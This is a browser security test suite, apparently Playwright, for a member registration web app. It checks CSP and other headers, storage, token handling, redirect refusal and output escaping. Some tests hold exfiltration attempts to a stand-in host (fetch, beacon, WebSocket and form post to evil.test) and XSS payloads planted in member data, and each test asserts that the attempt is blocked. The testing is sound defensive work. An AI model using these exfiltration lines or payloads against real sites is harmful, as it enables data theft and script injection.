// Security, tested where it matters: in a real browser, under the real headers, against what actually crosses the wire.
// Each test says what an attacker (or a mistake) would try, and shows that the browser or the page stops it.

import assert from 'node:assert/strict';
import { test } from '../framework.mjs';
import { PASSWORD, USER } from '../harness.mjs';
import { eventually, resultRows, searchStatus, signIn, signedIn, sleep, typeInSearch, waitForNotice, waitForResults } from '../ui.mjs';

async function find(page, text) {
  await typeInSearch(page, text);
  return waitForResults(page, (rows) => rows.length === 1);
}

async function issue(page, text) {
  await find(page, text);
  await page.keyboard.press('Enter');
  await waitForNotice(page, /QR issued for/);
}

const escapeRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

test('security: the page is served with the strict headers (policy, no framing, no referrer, no sniffing, no cache of the page)', async ({ page, site }) => {
  const response = await page.reload();
  const headers = response.headers();
  const csp = headers['content-security-policy'];
  assert.ok(csp, 'no Content-Security-Policy header');
  for (const directive of ["default-src 'none'", "script-src 'self'", "style-src 'self'", "font-src 'self'", "img-src 'self'", "base-uri 'none'", "form-action 'none'", "object-src 'none'", "frame-ancestors 'none'", "require-trusted-types-for 'script'", "trusted-types 'none'"]) {
    assert.ok(csp.includes(directive), `the policy lacks ${directive}: ${csp}`);
  }
  assert.match(csp, new RegExp(`connect-src 'self' ${escapeRe(site.apiUrl)};`), 'the page may talk to itself and to the one server, nobody else');
  assert.ok(!/unsafe-inline|unsafe-eval|unsafe-hashes|\*|data:|blob:/.test(csp), `the policy has a loophole: ${csp}`);
  assert.equal(headers['x-content-type-options'], 'nosniff');
  assert.equal(headers['x-frame-options'], 'DENY');
  assert.equal(headers['referrer-policy'], 'no-referrer');
  assert.equal(headers['cross-origin-opener-policy'], 'same-origin');
  assert.equal(headers['cross-origin-resource-policy'], 'same-origin');
  assert.match(headers['permissions-policy'], /camera=\(\).*microphone=\(\).*geolocation=\(\)/);
  assert.equal(headers['cache-control'], 'no-cache', 'the page itself is always checked with the server, so an update reaches every desk');
  const font = await page.evaluate(async () => {
    const link = [...document.styleSheets].length; // the stylesheet has loaded, so the fonts it names can be asked for
    const r = await fetch('fonts/atkinson-hyperlegible-next-latin-wght-normal.woff2');
    return { link, status: r.status, cache: r.headers.get('cache-control') };
  });
  assert.equal(font.status, 200);
  assert.equal(font.cache, 'public, max-age=31536000, immutable');
});

test('security: the browser itself refuses inline script, innerHTML, other servers, beacons, sockets and form posts', async (session) => {
  // (eval and new Function cannot be tried from here: code run by the test tool is exempt from that rule by design. They are covered
  //  by the header test - the policy has no 'unsafe-eval' - and by the source scan in tools/lint.mjs, which forbids them.)
  const { page, site } = session;
  await signedIn(page);
  const refused = [];
  const answered = [];
  page.on('requestfailed', (r) => r.url().includes('evil.test') && refused.push(`${r.url()} -> ${r.failure()?.errorText}`));
  page.on('requestfinished', (r) => r.url().includes('evil.test') && answered.push(r.url()));
  const outcome = await page.evaluate(async () => {
    const out = {};
    window.__violations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(`${e.violatedDirective} | ${e.blockedURI}`));
    const attempt = async (name, fn) => {
      try {
        out[name] = String(await fn());
      } catch (e) {
        out[name] = `blocked: ${e.name}`;
      }
    };
    await attempt('inlineScript', () => {
      const s = document.createElement('script');
      s.textContent = 'window.__pwned = 1';
      document.body.appendChild(s);
      return 'ran';
    });
    await attempt('innerHTML', () => {
      document.createElement('div').innerHTML = '<img src=x onerror="window.__pwned = 2">';
      return 'allowed';
    });
    await attempt('thirdPartyFetch', () => fetch('https://evil.test/steal?x=1').then(() => 'sent'));
    await attempt('beacon', () => navigator.sendBeacon('https://evil.test/beacon', 'x'));
    await attempt(
      'webSocket',
      () =>
        new Promise((resolve, reject) => {
          const ws = new WebSocket('wss://evil.test/ws'); // the constructor does not throw: the socket just never opens
          ws.onopen = () => resolve('opened');
          ws.onerror = () => reject(Object.assign(new Error('refused'), { name: 'Refused' }));
          setTimeout(() => resolve('still waiting'), 1500);
        }),
    );
    await attempt('formPost', () => {
      const f = document.createElement('form');
      f.method = 'post';
      f.action = 'https://evil.test/collect';
      document.body.appendChild(f);
      f.submit();
      return 'submitted';
    });
    new Image().src = 'https://evil.test/pixel.png';
    await new Promise((r) => setTimeout(r, 400));
    out.pwned = window.__pwned ?? null;
    out.stayedHere = location.origin;
    out.violations = window.__violations.slice();
    return out;
  });
  assert.match(outcome.inlineScript, /^blocked/, 'an inline script was allowed to be created');
  assert.match(outcome.innerHTML, /^blocked/, 'innerHTML accepted a plain string');
  assert.match(outcome.thirdPartyFetch, /^blocked/, 'a request to another server was sent');
  // (sendBeacon() answers true when it has QUEUED the data; the connection itself is then refused - the violation report below proves it)
  assert.ok(outcome.violations.some((v) => v.startsWith('connect-src') && v.includes('https://evil.test/beacon')), `the beacon was not refused: ${outcome.violations}`);
  assert.match(outcome.webSocket, /^blocked/, 'a WebSocket to another server was opened');
  // (evil.test does not exist, so a failure alone would prove nothing: the policy's own report proves it was the policy)
  assert.ok(outcome.violations.some((v) => v.startsWith('connect-src') && v.includes('wss://evil.test/ws')), `the socket was not refused by the policy: ${outcome.violations}`);
  assert.equal(outcome.pwned, null, 'injected script ran');
  assert.equal(outcome.stayedHere, site.origin, 'a form post took the page away');
  const directives = outcome.violations.map((v) => v.split(' | ')[0]);
  for (const d of ['connect-src', 'form-action', 'img-src']) assert.ok(directives.includes(d), `no ${d} violation was reported: ${outcome.violations}`);
  // the browser lists a request even when it refuses to send it; what matters is that none was answered and each failed by the policy
  assert.deepEqual(answered, [], 'a request to evil.test was answered');
  assert.ok(refused.length >= 1 && refused.every((r) => /csp/i.test(r)), `requests to evil.test must each fail with the policy's refusal:\n${refused.join('\n')}`);
});

test('security: the page cannot be shown inside another site\'s frame (clickjacking)', async ({ context, site }) => {
  const other = await context.newPage();
  await other.goto('about:blank');
  await other.evaluate((url) => {
    const frame = document.createElement('iframe');
    frame.src = url;
    document.body.appendChild(frame);
  }, site.url);
  await eventually(() => other.frames().length === 2, { message: 'the frame to be created' });
  await sleep(800);
  const child = other.frames().find((f) => f !== other.mainFrame());
  assert.ok(!child.url().startsWith(site.origin), `the page was shown in a frame (${child.url()})`);
  const text = await child.locator('body').innerText().catch(() => '');
  assert.ok(!/Registration desk|Sign in/.test(text), 'the sign-in form is visible inside another site');
  await other.close();
});

test('security: nothing about the person or the members is left in the browser, and the token is nowhere on the page', async (session) => {
  const { page, context, stub } = session;
  await signedIn(page);
  await issue(page, 'A0001');
  const token = [...stub.state.tokens.keys()][0];
  assert.ok(token, 'the stand-in server issued no token');
  const state = await page.evaluate(async () => ({
    local: Object.keys(localStorage),
    session: Object.keys(sessionStorage),
    cookie: document.cookie,
    databases: (await indexedDB.databases?.())?.map((d) => d.name) ?? [],
    caches: await caches.keys(),
    workers: (await navigator.serviceWorker.getRegistrations()).length,
    historyState: history.state,
    windowName: window.name,
    html: document.documentElement.outerHTML,
    text: document.body.innerText,
    values: [...document.querySelectorAll('input[type=text], input[type=password]')].map((i) => i.value),
    title: document.title,
    url: location.href,
  }));
  assert.deepEqual(state.local, [], 'localStorage is not used');
  assert.deepEqual(state.session, [], 'sessionStorage is not used');
  assert.equal(state.cookie, '');
  assert.deepEqual(await context.cookies(), []);
  assert.deepEqual(state.databases, [], 'IndexedDB is not used');
  assert.deepEqual(state.caches, [], 'the Cache API is not used');
  assert.equal(state.workers, 0, 'no service worker keeps copies');
  assert.equal(state.historyState, null);
  assert.equal(state.windowName, '');
  assert.ok(!state.html.includes(token) && !state.text.includes(token) && !state.url.includes(token) && !state.title.includes(token), 'the token is visible on the page');
  assert.ok(!state.html.includes(PASSWORD) && !state.url.includes('horse'), 'the password is visible on the page');
  assert.deepEqual(state.values.filter((v) => v.length > 0 && v !== 'A0001' && v !== ''), [], 'a form field still holds something');
  assert.equal(new URL(state.url).search, '');
  assert.equal(new URL(state.url).hash, '');
});

test('security: only this site and the one server are ever contacted; the token goes only to the server; no cookie, no referrer, no secret in any address', async (session) => {
  const { page, context, stub, site, seen } = session;
  // a cookie that already sits in the browser for the server's address must NOT be sent (the server is bearer-only: no ambient authority).
  // It is SameSite=None; Secure on purpose: a default (Lax) cookie is held back by the browser on a call from another site whatever the
  // page asks for, so with such a cookie this check could never fail - with this one it fails the moment a request says credentials: 'include'.
  await context.addCookies([{ name: 'sid', value: 'ambient-authority', url: site.apiUrl, sameSite: 'None', secure: true }]);
  const console_ = [];
  page.on('console', (m) => console_.push(m.text()));

  await signedIn(page);
  await issue(page, 'A0001');
  await find(page, 'A0004');
  stub.inject({ method: 'POST', path: /qr-issued/, type: 'status', status: 502 });
  await page.keyboard.press('Enter');
  await waitForNotice(page, /HTTP 502/);
  const token = [...stub.state.tokens.keys()][0];

  const allowed = new Set([site.origin, new URL(site.apiUrl).origin]);
  const origins = [...new Set(seen.requests.map((r) => new URL(r.url).origin))];
  assert.ok(origins.every((o) => allowed.has(o)), `the page contacted somebody else: ${origins}`);

  const toServer = stub.state.log.filter((e) => e.method !== 'OPTIONS');
  assert.ok(toServer.length >= 6, 'the flow reached the server');
  for (const e of toServer) {
    const anonymous = e.path === '/api/v1/health/live' || e.path === '/api/v1/auth/registration-login';
    if (anonymous) assert.equal(e.authorization, null, `${e.path} carries the token although it needs none`);
    else assert.equal(e.authorization, `Bearer ${token}`, `${e.method} ${e.path} has no token`);
  }
  for (const e of stub.state.log) {
    assert.equal(e.cookie, null, `${e.method} ${e.path} sent a cookie`);
    assert.equal(e.referer, null, `${e.method} ${e.path} told the server which page it came from`);
    assert.ok(!e.query.includes(token) && !e.path.includes(token), 'the token is in an address');
    assert.ok(!/correct|horse/i.test(`${e.path}${e.query}`), 'the password is in an address');
  }
  assert.ok(stub.state.log.some((e) => e.secFetchMode === 'cors'), 'requests are cross-origin CORS requests (the setting this test is about)');
  for (const e of site.log) {
    assert.equal(e.authorization, null, 'the token went to the web server');
    assert.equal(e.cookie, null);
    assert.equal(e.method, 'GET');
  }
  const noise = console_.join('\n');
  assert.ok(!noise.includes(token) && !noise.includes(PASSWORD) && !/Juan|Josefa/.test(noise), `the page wrote a secret or a member's name to the console:\n${noise}`);
});

test('security: a redirect from the server is never followed (the token must not be carried to another address)', async ({ page, stub }) => {
  await signedIn(page);
  stub.inject({ method: 'GET', path: /members\/search/, type: 'status', status: 307, headers: { Location: '/api/v1/redirect-target' } });
  await typeInSearch(page, 'dela');
  await eventually(async () => (await page.locator('#search-status').getAttribute('class')).includes('is-error'), { message: 'the search to be reported as failed' });
  await sleep(300);
  assert.equal(stub.state.log.filter((e) => e.path === '/api/v1/redirect-target').length, 0, 'the redirect was followed');
  assert.equal(stub.searches().length, 1);
  assert.equal(new URL(page.url()).pathname, '/');
});

test('security: text from the server is only ever text - names, remarks and addresses full of HTML and script do nothing', async (session) => {
  const { page, stub } = session;
  const nasty = {
    name: '<img src=x onerror="window.__xss=1">Mallory <b>Bold</b>',
    address: '"><script>window.__xss=2</script>',
    remarks: '<svg onload="window.__xss=3"></svg><a href="javascript:window.__xss=4">click</a>',
  };
  const base = stub.state.members[0];
  stub.state.members.push({ ...base, memberId: 9101, accountCode: 'X0001', memberName: nasty.name, memberAddress: nasty.address, branchId: 1 });
  stub.state.members.push({ ...base, memberId: 9102, accountCode: 'X0002', memberName: 'Evil Remarks', memberAddress: nasty.address, branchId: 1, isEligibleToVote: false, votingRemarks: nasty.remarks });
  await signedIn(page);

  const injected = () => page.evaluate(() => ({
    xss: window.__xss ?? null,
    elements: document.querySelectorAll('img, iframe, object, embed, script:not([src]), a[href^="javascript"], svg[onload], [onerror], [onload]').length,
    bold: [...document.querySelectorAll('#results b, .detail b, .slip b, .recent b')].length,
  }));

  // found, listed, chosen
  await typeInSearch(page, 'mallory');
  const rows = await waitForResults(page, (r) => r.length === 1);
  assert.equal(rows[0].name, nasty.name, 'the name must be shown exactly as written, as text');
  assert.deepEqual(await injected(), { xss: null, elements: 0, bold: 0 });
  assert.equal(await page.locator('.detail-name').textContent(), nasty.name);
  await page.locator('details.more summary').click();
  assert.match(await page.locator('.more-list').textContent(), /<script>window\.__xss=2<\/script>/, 'the address is shown as text');

  // issued: slip, notice, strip, print area, review list
  await page.locator('#search-input').click(); // (opening "More details" moved the cursor there; Enter is for the search box)
  await page.keyboard.press('Enter');
  await waitForNotice(page, /QR issued for/);
  assert.equal(await page.locator('.slip-area .slip-name').textContent(), nasty.name);
  assert.match(await page.locator('#print-root').textContent(), /Mallory/);
  await page.getByRole('button', { name: /^Review records/ }).click();
  await page.getByRole('dialog', { name: 'Review records' }).getByLabel('Latest records (all states)').check();
  assert.match(await page.locator('.records-table').textContent(), /<img src=x/);
  assert.deepEqual(await injected(), { xss: null, elements: 0, bold: 0 });
  await page.keyboard.press('Escape');

  // remarks of a member who is not eligible
  await typeInSearch(page, 'evil remarks');
  await waitForResults(page, (r) => r.length === 1);
  assert.match(await page.locator('.eligibility-reason').textContent(), /<svg onload=/);
  assert.deepEqual(await injected(), { xss: null, elements: 0, bold: 0 });

  // what is typed into the search box is text too, and cannot break the page
  await typeInSearch(page, '<b>(.*)+[\\');
  await eventually(async () => /No member found for "<b>\(\.\*\)\+\[\\"/.test(await searchStatus(page)), { message: 'the no-match sentence with the typed text' });
  assert.deepEqual(await injected(), { xss: null, elements: 0, bold: 0 });
  assert.deepEqual(session.seen.pageErrors, []);
  assert.deepEqual(session.seen.csp, [], 'the page broke its own policy while showing the text');
});

test('security: pressing Enter in the sign-in form never sends the password in the address, even when the answer is "wrong"', async ({ page }) => {
  await signIn(page, USER, 'wrong password');
  await eventually(async () => /Wrong user name/.test(await page.locator('.login .form-error').textContent()), { message: 'the refusal' });
  const url = new URL(page.url());
  assert.equal(url.search, '');
  assert.ok(!url.href.includes('password') && !url.href.includes('wrong'));
  assert.equal(await page.locator('#login-user').getAttribute('autocomplete'), 'username');
  assert.equal(await page.locator('#login-password').getAttribute('autocomplete'), 'current-password');
});

test('security: the member search box is not remembered or spell-checked by the browser (member names are not sent anywhere)', async ({ page }) => {
  await signedIn(page);
  const box = page.locator('#search-input');
  assert.equal(await box.getAttribute('autocomplete'), 'off');
  assert.equal(await box.getAttribute('spellcheck'), 'false');
  assert.equal(await box.getAttribute('autocorrect'), 'off');
});

test('security: a server address that the page\'s own policy does not allow is explained as such (not as "offline")', async ({ page, seen }) => {
  await eventually(async () => (await page.locator('.login-server-state').textContent()).trim() === 'not reachable', { message: 'not reachable' });
  await signIn(page);
  await eventually(async () => /security policy/i.test(await page.locator('.login .form-error').textContent()), { message: 'the explanation about the policy' });
  assert.ok(seen.csp.length > 0, 'the browser reported the blocked connection');
  assert.match(await page.locator('.login .form-error').textContent(), /tools\/set-api-url\.mjs/, 'it says which tool fixes it');
}, {
  tweak: async (dir) => {
    const { readFile, writeFile } = await import('node:fs/promises');
    const file = `${dir}/index.html`;
    await writeFile(file, (await readFile(file, 'utf8')).replace(/connect-src 'self' https:\/\/[^;]+;/, "connect-src 'self';"));
  },
});

test('security: with the page and /api/ on the same address (reverse proxy) there is no CORS pre-flight at all - one request per search instead of two', async (session, lab) => {
  const { page, stub, context, site } = session; // this session is the same-address one
  // On the same address the browser would attach this cookie to every call unless the page says credentials: 'omit' (the default,
  // 'same-origin', sends it) - and the proxy would hand it on to the server.
  await context.addCookies([{ name: 'sid', value: 'ambient-authority', url: site.origin }]);
  await signedIn(page);
  await typeInSearch(page, 'dela');
  await waitForResults(page, (r) => r.length === 3);
  await typeInSearch(page, 'maria');
  await waitForResults(page, (r) => r.length === 1);
  const sameSearches = stub.searches().length;
  await issue(page, 'A0001'); // one more search and the POST: no pre-flight for those either
  const apiCalls = site.log.filter((e) => e.path.startsWith('/api/'));
  assert.ok(apiCalls.length >= 5, `only ${apiCalls.length} calls to /api/ were seen`);
  for (const e of apiCalls) assert.equal(e.cookie, null, `${e.method} ${e.path} sent the cookie of this site to the server`);
  for (const e of stub.state.log) assert.equal(e.cookie, null, `${e.method} ${e.path} reached the server with a cookie`);
  const preflightsOfSearch = (log) => log.filter((e) => e.method === 'OPTIONS' && e.path === '/api/v1/registration/members/search').length;
  const sameOptions = stub.state.log.filter((e) => e.method === 'OPTIONS').length;
  assert.equal(sameOptions, 0, 'a same-address deployment must not need any pre-flight');
  assert.equal(sameSearches, 2);

  const other = await lab.open({ mode: 'cross' });
  try {
    await signedIn(other.page);
    await typeInSearch(other.page, 'dela');
    await waitForResults(other.page, (r) => r.length === 3);
    await typeInSearch(other.page, 'maria');
    await waitForResults(other.page, (r) => r.length === 1);
    const crossSearches = other.stub.searches().length;
    const crossPreflights = preflightsOfSearch(other.stub.state.log);
    assert.equal(crossSearches, 2);
    assert.equal(crossPreflights, crossSearches, 'across two addresses every distinct search is preceded by its own pre-flight (the server does not allow the browser to remember it)');
    console.log(`         (requests per search - same address: ${(sameSearches + sameOptions) / sameSearches}, two addresses: ${(crossSearches + crossPreflights) / crossSearches})`);
  } finally {
    await other.close();
  }
}, { mode: 'same' });
